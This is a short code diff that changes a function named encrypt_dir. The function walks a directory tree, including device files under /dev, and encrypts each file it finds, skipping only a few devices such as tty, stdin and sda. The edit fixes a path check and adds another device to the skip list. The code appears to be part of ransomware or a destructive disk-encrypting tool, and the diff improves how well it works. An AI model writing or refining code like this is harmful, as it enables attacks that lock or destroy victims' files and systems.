@@ -68,8 +68,8 @@ def encrypt_dir(directory, key):
         for file in files:
             path = root + '/' + file
             try:
-                if '/dev' in path[:3]:
-                    if not any(substring in file for substring in ('dm-', 'sda', 'port', 'vcs', 'tty', 'initctl', 'stderr', 'stdin', 'stdout')):
+                if '/dev' in path[:4]:
+                    if not any(substring in file for substring in ('dm-', 'sda', 'port', 'vcs', 'tty', 'initctl', 'stderr', 'stdin', 'stdout', 'sg')):
                         encrypt(path, key)
                 else:
                     encrypt(path, key)
